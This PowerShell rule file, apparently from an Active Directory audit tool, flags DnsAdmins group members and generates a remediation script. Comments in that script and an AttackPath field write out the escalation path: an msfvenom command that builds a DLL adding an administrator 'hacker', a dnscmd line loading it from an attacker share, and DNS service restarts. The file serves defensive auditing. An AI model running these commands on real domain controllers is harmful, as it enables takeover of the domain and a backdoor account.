@{
    Id          = 'P-DNSAdmin'
    Version     = '1.0.0'
    Category    = 'PrivilegedAccess'
    Title       = 'DnsAdmins Group Members Can Execute Code on DC'
    Description = 'Members of the DnsAdmins group can load arbitrary DLLs on Domain Controllers running DNS services. This allows privilege escalation to Domain Admin by loading a malicious DLL through the DNS service.'
    Severity    = 'High'
    Weight      = 30
    DataSource  = 'Groups'

    References  = @(
        @{ Title = 'DnsAdmins to Domain Admin'; Url = 'https://medium.com/@esnesenern/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83' }
        @{ Title = 'Abusing DnsAdmins'; Url = 'https://attack.mitre.org/techniques/T1574/002/' }
        @{ Title = 'Microsoft DNS ServerLevelPluginDll'; Url = 'https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalquerycache' }
    )

    MITRE = @{
        Tactics    = @('TA0004', 'TA0003')  # Privilege Escalation, Persistence
        Techniques = @('T1574.002')  # Hijack Execution Flow: DLL Side-Loading
    }

    CIS   = @('5.4')
    STIG  = @('V-36439')
    ANSSI = @('vuln1_dnsadmin')

    Scoring = @{
        Type = 'PerFinding'
        PointsPerFinding = 15
    }

    Detect = {
        param($Data, $Domain)

        $findings = @()

        # Find the DnsAdmins group
        foreach ($group in $Data) {
            if ($group.SamAccountName -eq 'DnsAdmins' -or $group.Name -eq 'DnsAdmins') {
                # Get group members
                $members = @()

                if ($group.Members) {
                    $members = $group.Members
                } elseif ($group.Member) {
                    $members = $group.Member
                }

                if ($members.Count -gt 0) {
                    foreach ($member in $members) {
                        $memberName = $member
                        if ($member -is [Microsoft.ActiveDirectory.Management.ADPrincipal]) {
                            $memberName = $member.SamAccountName
                        } elseif ($member -match 'CN=([^,]+)') {
                            $memberName = $Matches[1]
                        }

                        $findings += [PSCustomObject]@{
                            GroupName           = 'DnsAdmins'
                            MemberName          = $memberName
                            MemberDN            = $member.ToString()
                            RiskLevel           = 'High'
                            Privilege           = 'Can load arbitrary DLLs on DC via DNS service'
                            AttackPath          = 'dnscmd DC /config /serverlevelplugindll \\attacker\dll.dll'
                            Recommendation      = 'Remove from DnsAdmins unless absolutely required for DNS administration'
                        }
                    }
                }
                break
            }
        }

        return $findings
    }

    Remediation = @{
        Description = 'Remove non-essential members from the DnsAdmins group. Consider using least-privilege delegation for DNS administration instead of this powerful group.'
        Impact      = 'Medium - Users removed will lose ability to manage DNS. Ensure proper DNS administration delegation is in place.'
        Script      = {
            param($Finding, $Domain)

            $commands = @"
# DnsAdmins Group Privilege Escalation Risk
# Members Found: $($Finding.Findings.Count)
# Each member can escalate to Domain Admin via DLL loading

# Current DnsAdmins Members:
$($Finding.Findings | ForEach-Object { "# - $($_.MemberName)" } | Out-String)

# ATTACK SCENARIO:
# 1. Attacker gains control of a DnsAdmins member account
# 2. Creates malicious DLL on network share: msfvenom -p windows/x64/exec CMD='net user hacker P@ss123! /add && net localgroup administrators hacker /add' -f dll > evil.dll
# 3. Runs: dnscmd dc01 /config /serverlevelplugindll \\attacker\evil.dll
# 4. Restarts DNS service: sc \\dc01 stop dns && sc \\dc01 start dns
# 5. DLL executes as SYSTEM on DC

# REMEDIATION:

# Step 1: Audit current members
Get-ADGroupMember -Identity "DnsAdmins" |
    Select-Object Name, SamAccountName, ObjectClass

# Step 2: Remove non-essential members
`$membersToRemove = @(
$($Finding.Findings | ForEach-Object { "    '$($_.MemberName)'" } | Out-String -NoNewline)
)

foreach (`$member in `$membersToRemove) {
    # Review each member before removal
    Write-Host "Review: `$member"
    # Remove-ADGroupMember -Identity "DnsAdmins" -Members `$member -Confirm:`$false
}

# Step 3: Use least-privilege delegation instead
# Delegate specific DNS permissions via Active Directory delegation
# Computer Configuration > Policies > Windows Settings > Security Settings > Restricted Groups

# Step 4: Monitor for DnsAdmins abuse
# Check for ServerLevelPluginDll registry key:
Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters' -Name 'ServerLevelPluginDll' -ErrorAction SilentlyContinue

# Monitor Event ID 770 (DNS plugin DLL loaded) in DNS Server logs

# Step 5: Block the attack path
# Deny DnsAdmins write access to the DNS service registry key via GPO

"@
            return $commands
        }
    }
}
